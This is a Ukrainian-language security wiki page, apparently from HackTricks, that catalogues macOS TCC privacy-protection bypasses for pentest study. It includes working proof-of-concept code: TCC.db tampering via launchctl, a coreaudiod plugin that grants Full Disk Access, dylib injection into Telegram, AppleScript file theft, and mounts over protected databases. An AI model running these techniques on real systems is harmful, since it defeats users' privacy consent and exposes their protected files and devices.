# Обходи macOS TCC

{{#include ../../../../../banners/hacktricks-training.md}}

## За функціональністю

### Обхід запису

Це не обхід, а просто особливість роботи TCC: **він не захищає від запису**. Якщо Terminal **не має доступу до читання Desktop користувача, він усе одно може записувати до нього**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Розширений атрибут **`com.apple.macl`** додається до нового **file**, щоб надати **creators app** доступ для його читання.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Можна **розмістити вікно поверх запиту TCC**, щоб змусити користувача **прийняти** його, не помітивши цього. PoC можна знайти в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker може **створювати apps з будь-якою назвою** (наприклад, Finder, Google Chrome...) у **`Info.plist`** і змушувати їх запитувати доступ до певного місця, захищеного TCC. Користувач думатиме, що цей доступ запитує легітимний application.\
Крім того, можна **видалити легітимний app з Dock і розмістити там fake app**, тому, коли користувач натисне на fake app (який може використовувати такий самий icon), він зможе викликати легітимний app, запитати дозволи TCC і виконати malware, змусивши користувача повірити, що доступ запитував легітимний app.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Більше інформації та PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

За замовчуванням доступ через **SSH мав "Full Disk Access"**. Щоб вимкнути це, потрібно, щоб SSH був доданий до списку, але вимкнений (видалення зі списку не забере ці привілеї):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: За замовчуванням доступ через SSH мав "Full Disk Access". Щоб вимкнути це, потрібно, щоб SSH був доданий до списку, але вимкнений (видалення зі списку...](<../../../../../images/image (1077).png>)

Тут можна знайти приклади того, як деякі **malwares змогли обійти цей захист**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Зверніть увагу, що тепер для можливості ввімкнути SSH потрібен **Full Disk Access**

### Handle extensions - CVE-2022-26767

Атрибут **`com.apple.macl`** надається files, щоб надати **певному application дозволи на його читання.** Цей атрибут встановлюється, коли file **перетягують** на app або коли користувач **двічі клацає** file, щоб відкрити його за допомогою **default application**.

Отже, користувач міг би **зареєструвати malicious app** для обробки всіх розширень і викликати Launch Services, щоб **відкрити** будь-який file (тому malicious file отримає доступ для читання).<sup>[[23]](#references)</sup>

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** дає можливість взаємодіяти з **`com.apple.iCloudHelper`** XPC service, який **надає iCloud tokens**.

**iMovie** і **Garageband** мали цей entitlement та інші, які це дозволяли.

Щоб отримати більше **інформації** про exploit для **отримання icloud tokens** за допомогою цього entitlement, перегляньте доповідь: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

App із дозволом **`kTCCServiceAppleEvents`** зможе **керувати іншими Apps**. Це означає, що він зможе **зловживати дозволами, наданими іншим Apps**.<sup>[[2]](#references)</sup>

Докладніше про Apple Scripts:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Наприклад, якщо App має **Automation permission для `iTerm`**, то в цьому прикладі **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, який не має FDA, може викликати iTerm, який його має, і використовувати його для виконання дій:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Через Finder

Або якщо App має доступ через Finder, він може виконати такий script:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## За поведінкою App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Користувацький **tccd daemon** використовував змінну **`HOME`** **env** для доступу до бази даних користувачів TCC за адресою: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цим дописом на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), оскільки TCC daemon працює через **`launchd`** у домені поточного користувача, існує можливість **контролювати всі змінні середовища**, передані йому.<sup>[[19]](#references)</sup>\
Таким чином, **зловмисник міг установити змінну середовища `$HOME`** у **`launchctl`**, щоб вона вказувала на **контрольований** **каталог**, перезапустити **TCC** daemon, а потім **безпосередньо змінити базу даних TCC**, надавши собі **кожен доступний TCC entitlement** без будь-якого запиту до кінцевого користувача.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Нотатки

Notes мав доступ до TCC-захищених розташувань, але щойно створена нотатка **зберігалася в незахищеному розташуванні**. Тому зловмисник міг попросити Notes скопіювати захищений файл у нотатку, а потім отримати доступ до отриманих даних із незахищеного розташування:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Бінарний файл `/usr/libexec/lsd` із бібліотекою `libsecurity_translocate` мав entitlement `com.apple.private.nullfs_allow`, який дозволяв йому створювати монтування **nullfs**, а також entitlement `com.apple.private.tcc.allow` із **`kTCCServiceSystemPolicyAllFiles`** для доступу до кожного файлу.

Можна було додати атрибут quarantine до "Library", викликати XPC service **`com.apple.security.translocation`**, після чого він відображав Library у **`$TMPDIR/AppTranslocation/d/d/Library`**, де всі документи всередині Library можна було **отримати**.

### CVE-2024-44131 - FileProvider symlink race

Програми, які передають файлові операції **привілейованому helper** (тут **`fileproviderd`** / **`Files.app`**), копіюють або переміщують елементи **від імені користувача**, тому копіювання виконується з привілеями helper, а не caller.

Jamf Threat Labs показала, що перевірку symlink, яка виконується перед операцією, можна **обійти за допомогою race condition**: замість розміщення symlink в **останньому** компоненті шляху (який перевіряється), зловмисник замінює **проміжний** каталог шляху **після того, як копіювання вже почалося**. Після цього привілейований helper переходить за link, контрольованим зловмисником, і читає/записує TCC-захищені розташування, **не показуючи жодного prompt**.<sup>[[5]](#references)</sup>

Каталоги, які **не захищені** випадковим UUID у своєму шляху (наприклад `~/Library/Mobile Documents/com~apple~CloudDocs`), є найпростішими цілями, оскільки зловмисник може передбачити повний шлях для race.

> [!TIP]
> Це загальний pattern, який слід шукати: **будь-який привілейований процес, що розв'язує шлях більше одного разу** (check-then-use або окреме розв'язання source і destination за допомогою `rename()`/`copyfile()`), можна атакувати через race, замінивши каталог у середині шляху. Лише `O_NOFOLLOW_ANY`, `openat()` для вже відкритого directory FD або `realpath()` + повторна валідація дійсно закривають це вікно.

Більше інформації у [**writeup від Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` можна зібрати з `SQLITE_ENABLE_SQLLOG`, що додає logging hook, керований environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – для **кожної відкритої database** **копія database file** і log SQL statements записуються в `path` (каталог має вже існувати).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – створювати **нову копію щоразу**, коли DB відкривається/приєднується, замість повторного використання наявної.
- **`SQLITE_SQLLOG_CONDITIONAL`** – логувати connection лише якщо поруч із main DB існує файл `<database>-sqllog`.

Якщо можна інжектувати цю змінну в процес, який має **FDA** і відкриває SQLite databases, він без проблем **скопіює ці захищені databases** у каталог, контрольований вами. Оскільки ім'я destination file формується з даних, контрольованих зловмисником, **symlink, розміщений у destination**, перетворює той самий primitive на **arbitrary file write** із привілеями target process.

### **SQLITE_AUTO_TRACE**

Якщо environment variable **`SQLITE_AUTO_TRACE`** встановлена, library **`libsqlite3.dylib`** почне **логувати** всі SQL queries. Багато applications використовували цю library, тому можна було логувати всі їхні SQLite queries.<sup>[[22]](#references)</sup>

Декілька Apple applications використовували цю library для доступу до TCC-захищеної інформації.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Пошук записів файлів, керованих env-змінними

Два попередні приклади є проявами тієї самої загальної техніки, тож варто пошукати інші: **фреймворки, завантажені в TCC-привілейовані застосунки, часто відкривають debug/logging environment variables, які змушують процес створювати файл за шляхом, контрольованим викликачем**.

Workflow для їх пошуку:

1. Виберіть ціль із FDA або іншим цінним TCC-дозволом (`Music`, `TV`, `Terminal`, MDM agents...) і перелічіть фреймворки, з якими вона пов’язана (`otool -L`, `vmmap`).
2. Виконайте grep цих фреймворків для рядків `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Встановіть кандидатні змінні через `launchctl setenv NAME /path/you/control`, запустіть застосунок і спостерігайте за його діями у файловій системі за допомогою `fs_usage -w -f filesys <pid>` або `sudo fs_usage | grep <path>`.
4. Якщо процес **створює або перейменовує** файл у вашому каталозі, ви отримали примітив запису: вкажіть як призначення symlink (або створіть race для проміжного каталогу, як у наведеному вище CVE-2024-44131), щоб перенаправити його до `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Це обмежують дві обставини. По-перше, змінні `DYLD_*` ігноруються hardened-runtime binaries, **якщо** застосунок не містить entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — див. також [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). По-друге, Apple видаляє окремі debug variables фреймворків після того, як про них повідомляють, тому змінна, яка працювала в одному релізі macOS, часто зникає в наступному. Якщо застосунок мовчки відмовляється запускатися після її встановлення, вважайте, що цю змінну вже відфільтровано.<sup>[[7]](#references)[[8]](#references)</sup>

Перегляньте [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md), щоб ознайомитися з еквівалентним трюком зі linker variables.

### Apple Remote Desktop

Як root можна було ввімкнути цей сервіс, і **ARD agent отримував би full disk access**, після чого користувач міг би використати його, щоб скопіювати нову **TCC user database**.

## Через **NFSHomeDirectory**

TCC використовує базу даних у папці HOME користувача для контролю доступу до ресурсів, специфічних для користувача, за шляхом **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Тому, якщо користувачеві вдасться перезапустити TCC зі змінною середовища $HOME, що вказує на **іншу папку**, він зможе створити нову TCC database у **/Library/Application Support/com.apple.TCC/TCC.db** і змусити TCC надати будь-який TCC permission будь-якому застосунку.

> [!TIP]
> Зверніть увагу, що Apple використовує налаштування, збережене у профілі користувача, в атрибуті **`NFSHomeDirectory`** як **значення `$HOME`**, тому якщо ви скомпрометуєте застосунок із дозволами на зміну цього значення (**`kTCCServiceSystemPolicySysAdminFiles`**), ви можете **weaponize** цей варіант за допомогою TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Перший POC** використовує [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) і [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) для зміни папки **HOME** користувача.

1. Отримайте _csreq_ blob для цільового застосунку.
2. Розмістіть підроблений файл _TCC.db_ з необхідним доступом і _csreq_ blob.
3. Експортуйте запис користувача в Directory Services за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змініть запис Directory Services, щоб змінити домашній каталог користувача.
5. Імпортуйте змінений запис Directory Services за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупиніть _tccd_ користувача та перезавантажте процес.

Другий POC використовував **`/usr/libexec/configd`**, який мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
Можна було запустити **`configd`** з опцією **`-t`**, за допомогою якої attacker міг вказати **custom Bundle для завантаження**. Таким чином, exploit **замінює** метод зміни домашнього каталогу користувача через **`dsexport`** і **`dsimport`** на **`configd` code injection**.

Додаткову інформацію див. у [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Через process injection

Існують різні техніки для ін’єкції коду всередину процесу та зловживання його TCC privileges:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Крім того, найпоширеніший спосіб process injection для обходу TCC використовує **plugins (load library)**.\
Plugins — це додатковий код, зазвичай у формі libraries або plist, який **завантажується головним застосунком** і виконується в його контексті. Тому якщо головний застосунок мав доступ до файлів, обмежених TCC (через надані permissions або entitlements), **custom code також його матиме**.

### CVE-2020-27937 - Directory Utility

Застосунок `/System/Library/CoreServices/Applications/Directory Utility.app` мав entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, завантажував plugins із розширенням **`.daplug`** і **не використовував hardened** runtime.

Щоб weaponize цей CVE, **`NFSHomeDirectory`** змінюється (зловживаючи попереднім entitlement), що дає змогу **перехопити TCC database користувача**e для обходу TCC.

Додаткову інформацію див. у [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.private.tcc.manager`. Перший **дозволяв code injection**, а другий надавав йому доступ для **керування TCC**.

Цей binary дозволяв завантажувати **third party plug-ins** із папки `/Library/Audio/Plug-Ins/HAL`. Тому можна було **завантажити plugin і зловживати TCC permissions** за допомогою цього POC:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Системні застосунки, які відкривають потік камери через Core Media I/O (застосунки з **`kTCCServiceCamera`**), завантажують у процес ці plugins, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (не обмежені SIP).

Достатньо просто зберегти там library зі стандартним **constructor**, щоб виконати **ін’єкцію коду**.

Декілька застосунків Apple були вразливими до цього.

### Firefox

Застосунок Firefox мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Більше інформації про те, як легко це експлуатувати, дивіться у [**оригінальному звіті**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав entitlements **`com.apple.private.tcc.allow`** і **`com.apple.security.get-task-allow`**, що дозволяло інжектити код у процес і використовувати привілеї TCC.

### CVE-2023-26818 - Telegram

Telegram мав entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** і **`com.apple.security.cs.disable-library-validation`**, тому його можна було використати для **отримання доступу до його дозволів**, наприклад для запису за допомогою камери. [**Payload можна знайти у writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Зверніть увагу, що для використання env variable з метою завантаження library було створено **custom plist** для інжекції цієї library, а для її запуску використано **`launchctl`**:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## За допомогою викликів `open`

Можна викликати **`open`**, навіть перебуваючи в sandbox

### Terminal Scripts

Досить поширено надавати Terminal **Full Disk Access (FDA)**, принаймні на комп’ютерах, якими користуються технічні спеціалісти. Також за його допомогою можна викликати скрипти **`.terminal`**.

**`.terminal`** скрипти — це plist-файли, подібні до цього, з командою для виконання в ключі **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Застосунок міг записати термінальний скрипт у розташування на кшталт `/tmp` і запустити його командою на кшталт:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Через монтування

### CVE-2020-9771 - mount_apfs TCC bypass і підвищення привілеїв

**Будь-який користувач** (навіть непривілейований) може створити та підключити snapshot Time Machine і **отримати доступ до ВСІХ файлів** цього snapshot.\
**Єдина необхідна привілейована умова** полягає в тому, щоб використовувана програма (наприклад, `Terminal`) мала доступ **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), який має надати адміністратор.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Більш детальне пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Навіть якщо файл TCC DB захищений, було можливо **змонтувати поверх директорії** новий файл TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Перевірте **повний exploit** у [**оригінальному writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Як пояснюється в [оригінальному writeup](https://www.kandji.io/blog/macos-audit-story-part2), ця CVE використовувала `diskarbitrationd`.<sup>[[16]](#references)</sup>

Функція `DADiskMountWithArgumentsCommon` із публічного фреймворку `DiskArbitration` виконувала перевірки безпеки. Однак їх можна обійти, безпосередньо викликавши `diskarbitrationd`, а отже, використовуючи елементи `../` у шляху та symlink-и.

Це дозволяло зловмиснику виконувати довільне монтування в будь-яке місце, зокрема поверх бази даних TCC, завдяки entitlement `com.apple.private.security.storage-exempt.heritable` процесу `diskarbitrationd`.

### asr

Інструмент **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці, обходячи захист TCC.

### CVE-2022-22655 - Служби геолокації

Служби геолокації **не** зберігаються в базі даних TCC, як інші служби. Ними керує `locationd`, який зберігає власний allow-list у **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Кожен запис ідентифікується клієнтом (bundle ID або шляхом до виконуваного файлу) і містить такі поля, як `Authorized`, `BundleId`, `Executable` і `Registered`.<sup>[[4]](#references)</sup>

Сам файл `clients.plist` захищений Sandbox/TCC і не може бути відредагований навіть із правами root — але **каталог `/var/db/locationd/` не був захищений від монтування**. Тому зловмисник, який працює з правами root, міг створити образ диска з власним `clients.plist` (позначивши свій бінарний файл як `Authorized`), змонтувати його поверх каталогу та перезапустити `locationd`, щоб підроблений список дозволів набув чинності.<sup>[[3]](#references)</sup>

> [!TIP]
> Це та сама схема, що й у наведених вище `hdiutil`/`mount` TCC bypass: *файл* захищений, а *каталог, у якому він розташований*, — ні, тому замінюється весь каталог, а не файл.

## За допомогою startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## За допомогою grep

У деяких випадках файли зберігатимуть чутливу інформацію, як-от адреси електронної пошти, номери телефонів, повідомлення... у незахищених місцях (що в Apple вважається вразливістю).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Це більше не працює, але [**раніше працювало**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Інший спосіб із використанням [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Обхід macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Обхід macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Setting environment variables on OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass and privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass by mounting over the TCC database](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
